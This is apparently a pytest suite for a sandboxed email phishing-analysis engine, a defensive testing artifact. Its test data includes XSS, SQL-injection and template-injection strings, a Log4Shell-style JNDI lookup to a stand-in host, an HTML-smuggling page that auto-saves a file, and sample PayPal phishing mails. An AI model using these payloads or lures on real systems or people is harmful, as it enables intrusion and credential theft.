"""The message engine around the parser: every failure is a stated verdict, never a guess, and the
worker's reply is treated as hostile. The sandbox is replaced by `run` callables here.
"""

import copy
import hashlib
import json
from collections.abc import Callable
from typing import Any

import filehelp as fh
import mailparse
import pytest
from mailhelp import (
    PHISH_LINK,
    analyze,
    eml,
    in_process,
    in_process_inspect,
    ok_result,
)

from core import sandbox
from core.contracts import ResponseAction, VerdictState
from core.email import engine
from core.email.engine import (
    ENGINE_VERSION,
    INSPECT_CAP,
    MAX_MESSAGE_BYTES,
    EmailAnalysis,
    _qr_url,
    analyze_message,
)

HELLO = b"From: a@x.test\r\n\r\nhi"
Run = Callable[[bytes], sandbox.Result]


def good() -> dict[str, Any]:
    return {"ok": True, "scan": mailparse.scan(eml())}


def replying(payload: dict[str, Any] | bytes, reason: str = "ok") -> Run:
    output = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
    return lambda _raw: ok_result(output, reason)


def forbidden(_raw: bytes) -> sandbox.Result:
    raise AssertionError("the sandbox must not be started for this input")


def state_and_reason(a: EmailAnalysis) -> tuple[VerdictState, str | None]:
    return a.report.verdict.state, a.report.reason


# ---- inputs that never reach the parser ----------------------------------------------------------


@pytest.mark.parametrize("raw", [b"", b"   ", b"\r\n\t \r\n"])
def test_an_empty_message_is_unknown_and_the_parser_is_not_started(raw: bytes) -> None:
    assert state_and_reason(analyze_message(raw, run=forbidden)) == (VerdictState.UNKNOWN, "empty")


def test_an_oversize_message_is_unknown_and_the_parser_is_not_started() -> None:
    a = analyze_message(b"a" * (MAX_MESSAGE_BYTES + 1), run=forbidden)
    assert state_and_reason(a) == (VerdictState.UNKNOWN, "too_large")
    assert a.input_sha256 == hashlib.sha256(b"a" * (MAX_MESSAGE_BYTES + 1)).hexdigest()


# ---- the sandbox failing is never "safe" ---------------------------------------------------------


def test_no_sandbox_is_an_error_not_an_unscanned_pass() -> None:
    def unavailable(_raw: bytes) -> sandbox.Result:
        raise sandbox.SandboxUnavailable("not built")

    a = analyze_message(HELLO, run=unavailable)
    v = a.report.verdict
    assert state_and_reason(a) == (VerdictState.ERROR, "sandbox_unavailable")
    assert v.risk_score is None and v.recommended_response is ResponseAction.NONE
    assert "not evidence of safety" in v.explanation


@pytest.mark.parametrize(
    "failure", [OSError("CreateProcess failed"), RuntimeError("bug"), ValueError("x")]
)
def test_any_launcher_failure_is_an_error_verdict(failure: Exception) -> None:
    def broken(_raw: bytes) -> sandbox.Result:
        raise failure

    a = analyze_message(HELLO, run=broken)
    assert state_and_reason(a) == (VerdictState.ERROR, "sandbox_error")
    assert a.report.verdict.risk_score is None


@pytest.mark.parametrize("why", ["timeout", "cpu_limit", "memory_limit", "output_limit", "crashed"])
def test_a_parser_that_was_stopped_is_unknown_with_its_reason(why: str) -> None:
    a = analyze_message(HELLO, run=replying(b"", why))
    assert state_and_reason(a) == (VerdictState.UNKNOWN, f"parser_{why}")
    assert a.report.verdict.risk_score is None


@pytest.mark.parametrize("error", ["mime_too_deep", "memory"])
def test_a_worker_that_gave_up_is_unknown(error: str) -> None:
    a = analyze_message(HELLO, run=replying({"error": error}))
    assert state_and_reason(a) == (VerdictState.UNKNOWN, error)


# ---- the worker's reply is hostile ---------------------------------------------------------------


def edit(change: Callable[[dict[str, Any]], None]) -> dict[str, Any]:
    reply = copy.deepcopy(good())
    change(reply["scan"])
    return reply


def with_both(reply: dict[str, Any]) -> dict[str, Any]:
    reply["error"] = "memory"
    return reply


HOSTILE: dict[str, dict[str, Any] | bytes] = {
    "not json": b"not json at all",
    "empty object": b"{}",
    "ok without scan": {"ok": True},
    "scan without ok": {"scan": good()["scan"]},
    "scan and error": with_both(good()),
    "unknown reply field": {**good(), "extra": 1},
    "unknown scan field": edit(lambda s: s.update(extra=1)),
    "unknown enum in link flags": edit(
        lambda s: s["links"].append(
            {"part": "1", "kind": "a", "url": "https://x.test/", "text": "", "flags": ["evil"]}
        )
    ),
    "unknown link kind": edit(
        lambda s: s["links"].append(
            {"part": "1", "kind": "exec", "url": "https://x.test/", "text": "", "flags": []}
        )
    ),
    "unknown limit name": edit(lambda s: s["limits_hit"].append("nothing")),
    "subject too long": edit(lambda s: s["headers"].update(subject="s" * 400)),
    "excerpt too long": edit(lambda s: s.update(excerpt="e" * 30_000)),
    "negative size": edit(lambda s: s.update(size=-1)),
    "bad hash": edit(lambda s: s.update(sha256="xyz")),
    "wrong version": edit(lambda s: s.update(v=2)),
    "too many parts": edit(lambda s: s.update(parts=s["parts"] * 600)),
    "count as string": edit(lambda s: s["html"].update(forms="many")),
    "unknown error name": {"error": "boom"},
    "error with ok": {"ok": True, "error": "memory"},
}


@pytest.mark.parametrize("name", sorted(HOSTILE))
def test_a_hostile_reply_is_an_error_verdict(name: str) -> None:
    a = analyze_message(HELLO, run=replying(HOSTILE[name]))
    assert state_and_reason(a) == (VerdictState.ERROR, "worker_output_invalid"), name
    assert a.report.verdict.risk_score is None and a.report.summary is None


def test_attacker_text_in_a_valid_reply_is_data_only() -> None:
    reply = good()
    reply["scan"]["headers"]["subject"] = "<script>alert(1)</script>'; DROP TABLE verdicts;--"
    reply["scan"]["excerpt"] = "{{7*7}} ${jndi:ldap://x.invalid/a} %s %n"
    a = analyze_message(HELLO, run=replying(reply))
    assert a.report.verdict.state in (VerdictState.UNKNOWN, VerdictState.SUSPICIOUS)
    assert "DROP TABLE" not in a.report.model_dump_json()


def test_an_engine_bug_is_an_explicit_error(monkeypatch: pytest.MonkeyPatch) -> None:
    def boom(*_a: object, **_k: object) -> None:
        raise RuntimeError("bug")

    monkeypatch.setattr(engine, "_links", boom)
    assert state_and_reason(analyze_message(HELLO, run=in_process)) == (VerdictState.ERROR, "error")


# ---- verdicts ------------------------------------------------------------------------------------


def test_a_message_with_no_signals_is_unknown_never_benign() -> None:
    a = analyze(eml())
    v = a.report.verdict
    assert state_and_reason(a) == (VerdictState.UNKNOWN, None)
    assert v.risk_score is None and v.signals == []
    assert "not evidence of safety" in v.explanation
    assert (
        v.recommended_response is ResponseAction.NONE and v.applied_response is ResponseAction.NONE
    )


def test_a_message_without_a_from_header_still_completes() -> None:
    a = analyze(b"Subject: x\r\n\r\nbody")
    assert a.report.verdict.state in (VerdictState.UNKNOWN, VerdictState.SUSPICIOUS)
    assert a.report.reason is None


def test_independent_evidence_makes_a_message_malicious_and_only_recommends_quarantine() -> None:
    raw = eml(
        sender='"PayPal Support" <help@paypal-login.test>',
        subject="Urgent: verify your account",
        text="Your account is suspended. Enter your password immediately.",
        html=PHISH_LINK,
        extra_headers=[("Authentication-Results", "mx.example.test; dmarc=fail; spf=fail")],
    )
    v = analyze(raw).report.verdict
    assert v.state is VerdictState.MALICIOUS and v.risk_score is not None and v.risk_score >= 80
    assert v.recommended_response is ResponseAction.QUARANTINE
    assert v.applied_response is ResponseAction.NONE
    assert len({s.category for s in v.signals}) >= 3


def test_link_findings_come_from_the_url_engine() -> None:
    raw = eml(text="Sign in at https://paypal-login.test/login.php?email=jane%40example.test")
    a = analyze(raw)
    ids = {s.rule_id for s in a.report.verdict.signals}
    assert {"url.combosquat", "url.prefilled_identity"} <= ids
    link_signals = [s for s in a.report.verdict.signals if s.rule_id.startswith("url.")]
    assert all(s.category.startswith("link.") for s in link_signals)
    assert "link_rule" in {e.kind for e in a.report.evidence}
    assert a.report.summary is not None and a.report.summary.links_analyzed == 1


def test_a_relative_link_needs_a_base_to_be_analysed() -> None:
    a = analyze(eml(html='<a href="/login">sign in</a>'))
    s = a.report.summary
    assert s is not None and s.relative_links_skipped == 1 and a.report.links == ()
    b = analyze(eml(html='<base href="https://base-site.test/"><a href="/login">sign in</a>'))
    assert [link.host for link in b.report.links] == ["base-site.test"]


def test_links_past_the_cap_are_counted_but_not_analysed() -> None:
    body = "".join(f'<a href="https://site{i}.test/p">l{i}</a>' for i in range(150))
    s = analyze(eml(html=body)).report.summary
    assert s is not None and s.links == 150 and s.links_analyzed == 100


def test_a_repeated_link_is_analysed_once(monkeypatch: pytest.MonkeyPatch) -> None:
    target = "https://repeat.test/a"
    calls: list[str] = []
    real = engine.analyze_url

    def counting(url: str) -> Any:
        calls.append(url)
        return real(url)

    monkeypatch.setattr(engine, "analyze_url", counting)
    analyze(eml(html=f'<a href="{target}">x</a>' * 20))
    assert calls.count(target) == 1


def test_the_same_message_gives_the_same_verdict() -> None:
    raw = eml(sender='"PayPal Support" <help@mailer-x.test>', html=PHISH_LINK)

    def shape(a: EmailAnalysis) -> tuple[Any, ...]:
        v = a.report.verdict
        return v.state, v.risk_score, [(s.rule_id, s.weight) for s in v.signals], v.explanation

    assert shape(analyze(raw)) == shape(analyze(raw))


def test_every_reference_in_a_verdict_resolves() -> None:
    a = analyze(eml(sender='"PayPal Support" <help@mailer-x.test>', html=PHISH_LINK))
    r = a.report
    ids = {e.id for e in r.evidence}
    assert set(r.verdict.evidence_ids) == ids
    assert all(set(s.evidence_ids) <= ids for s in r.verdict.signals)
    assert r.verdict.engine_version == ENGINE_VERSION
    assert r.verdict.ruleset_version.startswith("1.1.0+")


def test_what_storage_gets_is_hashes_and_hosts() -> None:
    raw = eml(html='<a href="https://paypal-login.test/PATHMARK?q=QUERYMARK">x</a>')
    a = analyze(raw)
    assert a.input_sha256 == hashlib.sha256(raw).hexdigest()
    dump = json.dumps([u.model_dump() for u in a.urls])
    assert a.urls and "PATHMARK" not in dump and "QUERYMARK" not in dump and "http" not in dump
    assert a.urls[0].host == "paypal-login.test"


def test_the_default_runner_is_looked_up_when_called(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(engine, "run_sandbox", in_process)
    assert analyze_message(eml(), None).report.reason is None


# ---- attachments: each opened in its own sandbox process -----------------------------------------


def pdf_mail(*extra: tuple[str, bytes, str]) -> bytes:
    return eml(attachments=[("a.pdf", fh.PDF_JS, "application/pdf"), *extra])


def inspecting(raw: bytes, inspect: Any) -> EmailAnalysis:
    return analyze_message(raw, run=in_process, inspect_run=inspect)


def rule_ids(a: EmailAnalysis) -> set[str]:
    return {s.rule_id for s in a.report.verdict.signals}


@pytest.mark.parametrize("why", ["timeout", "cpu_limit", "memory_limit", "output_limit", "crashed"])
def test_an_attachment_that_stopped_its_sandbox_is_stated_not_ignored(why: str) -> None:
    a = inspecting(pdf_mail(), lambda _raw, _path: ok_result(b"", why))
    (f,) = a.report.files
    assert (f.kind, f.status) == ("pdf", why)
    assert "email.file_inspection_incomplete" in rule_ids(a)
    assert a.report.verdict.state is not VerdictState.ERROR  # the rest of the message still counts


@pytest.mark.parametrize("failure", [OSError("CreateProcess failed"), RuntimeError("bug")])
def test_a_launcher_failure_for_one_attachment_does_not_end_the_analysis(
    failure: Exception,
) -> None:
    def broken(_raw: bytes, _path: str) -> sandbox.Result:
        raise failure

    a = inspecting(pdf_mail(), broken)
    assert a.report.files[0].status == "sandbox_error" and a.report.reason is None
    assert "email.file_inspection_incomplete" in rule_ids(a)


def test_no_sandbox_for_an_attachment_is_stated() -> None:
    def unavailable(_raw: bytes, _path: str) -> sandbox.Result:
        raise sandbox.SandboxUnavailable("gone")

    assert inspecting(pdf_mail(), unavailable).report.files[0].status == "sandbox_unavailable"


def archive_scan() -> dict[str, Any]:
    import archives

    return archives.scan_archive(fh.make_zip({"a.txt": b"x"}))


def pdf_scan() -> dict[str, Any]:
    import pdfscan

    return pdfscan.scan_pdf(fh.PDF_PLAIN)


def image_scan() -> dict[str, Any]:
    import imagescan

    return imagescan.scan_image(fh.blank_png())


HOSTILE_FILES: dict[str, dict[str, Any] | bytes] = {
    "not json": b"nope",
    "unknown kind": {"ok": True, "file": {"kind": "exe"}},
    "extra field": {"ok": True, "file": {"kind": "none", "extra": 1}},
    "file and error": {"ok": True, "file": {"kind": "none"}, "error": "memory"},
    "neither": {"ok": True},
    "ok missing": {"file": {"kind": "none"}},
    "bad extension key": {"ok": True, "file": {**archive_scan(), "exts": {"../x": 1}}},
    "negative count": {"ok": True, "file": {**archive_scan(), "entries": -1}},
    "too many uris": {"ok": True, "file": {**pdf_scan(), "uris": ["https://x.test/"] * 101}},
    "uri too long": {"ok": True, "file": {**pdf_scan(), "uris": ["h" * 3000]}},
    "too many qr": {"ok": True, "file": {**image_scan(), "qr": ["https://x.test/"] * 21}},
    "unknown limit": {"ok": True, "file": {**archive_scan(), "limits": ["boom"]}},
}


@pytest.mark.parametrize("name", sorted(HOSTILE_FILES))
def test_a_hostile_file_reply_is_a_stated_failure_not_data(name: str) -> None:
    payload = HOSTILE_FILES[name]
    output = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
    a = inspecting(pdf_mail(), lambda _raw, _path: ok_result(output))
    assert a.report.files[0].status == "invalid", name
    assert "email.pdf_javascript" not in rule_ids(a)


def test_unsupported_archive_formats_are_named_and_never_opened() -> None:
    def never(_raw: bytes, _path: str) -> sandbox.Result:
        raise AssertionError("an unsupported format must not start a sandbox")

    raw = eml(
        attachments=[("x.7z", b"7z\xbc\xaf\x27\x1c" + b"\x00" * 40, "application/x-7z-compressed")]
    )
    a = inspecting(raw, never)
    assert (a.report.files[0].kind, a.report.files[0].status) == ("7z", "unsupported")
    assert "email.file_inspection_incomplete" not in rule_ids(a)
    assert "email.archive_attachment" in rule_ids(a)


def test_identical_attachments_are_inspected_once_but_all_reported() -> None:
    calls: list[str] = []

    def counting(raw: bytes, path: str) -> sandbox.Result:
        calls.append(path)
        return in_process_inspect(raw, path)

    raw = eml(attachments=[(f"copy{i}.pdf", fh.PDF_JS, "application/pdf") for i in range(3)])
    a = inspecting(raw, counting)
    assert len(calls) == 1 and len(a.report.files) == 3
    assert {f.status for f in a.report.files} == {"ok"}


def test_inspection_is_capped_per_message_and_the_rest_are_reported_as_skipped() -> None:
    calls: list[str] = []

    def counting(raw: bytes, path: str) -> sandbox.Result:
        calls.append(path)
        return in_process_inspect(raw, path)

    raw = eml(
        attachments=[
            (f"i{n}.png", fh.blank_png(10 + n, 10), "image/png") for n in range(INSPECT_CAP + 4)
        ]
    )
    a = inspecting(raw, counting)
    assert len(calls) == INSPECT_CAP
    assert sorted(f.status for f in a.report.files).count("skipped") == 4
    assert "email.file_inspection_incomplete" in rule_ids(a)


def test_urls_found_in_a_pdf_go_through_the_url_engine() -> None:
    pdf = fh.pdf_with_uris("https://paypal-login.test/login.php?email=jane%40example.test")
    a = analyze(eml(attachments=[("statement.pdf", pdf, "application/pdf")]))
    assert {"url.combosquat", "url.prefilled_identity"} <= rule_ids(a)
    assert [link.kind for link in a.report.links] == ["pdf_uri"]
    assert a.urls and a.urls[0].host == "paypal-login.test"


def test_a_qr_code_url_goes_through_the_url_engine() -> None:
    png = fh.qr_png("https://paypal-login.test/login.php?email=jane%40example.test")
    a = analyze(eml(attachments=[("scan-me.png", png, "image/png")]))
    assert {"email.qr_code_link", "url.combosquat"} <= rule_ids(a)
    assert [link.kind for link in a.report.links] == ["qr"]


@pytest.mark.parametrize(
    ("payload", "url"),
    [
        ("https://x.test/a", "https://x.test/a"),
        ("phish-site.test/x?y=1", "https://phish-site.test/x?y=1"),
        ("mailto:a@x.test", "mailto:a@x.test"),
        ("just some words", None),
        ("", None),
        ("a b.test", None),
    ],
)
def test_qr_payloads_become_links_only_when_they_look_like_one(
    payload: str, url: str | None
) -> None:
    assert _qr_url(payload) == url


def test_attachment_findings_name_facts_and_not_file_text() -> None:
    entries = {"ENTRYMARK.pdf.exe": b"x", "readme.txt": b"hello"}
    pdf = fh.pdf_with_uris("https://uri-site.test/URIMARK")
    raw = eml(
        subject="SUBJMARK",
        attachments=[
            ("FILEMARK.zip", fh.make_zip(entries), "application/zip"),
            ("doc.pdf", pdf, "application/pdf"),
            ("QRFILE.png", fh.qr_png("https://qr-site.test/QRMARK"), "image/png"),
        ],
    )
    a = analyze(raw)
    said = " ".join(
        [a.report.verdict.explanation]
        + [s.description for s in a.report.verdict.signals]
        + [e.summary for e in a.report.evidence]
        + [fact for f in a.report.files for fact in (f.kind, f.status, *f.facts)]
    )
    assert a.report.files and "email.archive_double_extension" in rule_ids(a)
    for marker in ("ENTRYMARK", "FILEMARK", "URIMARK", "QRMARK", "QRFILE", "SUBJMARK"):
        assert marker not in said, marker


def test_a_page_that_builds_and_saves_a_file_is_flagged_as_smuggling() -> None:
    page = (
        b'<html><script>var b = new Blob([atob("QUJD")]); var a = document.createElement("a");'
        b'a.href = URL.createObjectURL(b); a.download = "invoice.zip"; a.click();</script></html>'
    )
    a = analyze(eml(attachments=[("invoice.html", page, "text/html")]))
    assert {"email.html_smuggling", "email.html_attachment"} <= rule_ids(a)
    assert a.report.verdict.state in (VerdictState.SUSPICIOUS, VerdictState.MALICIOUS)
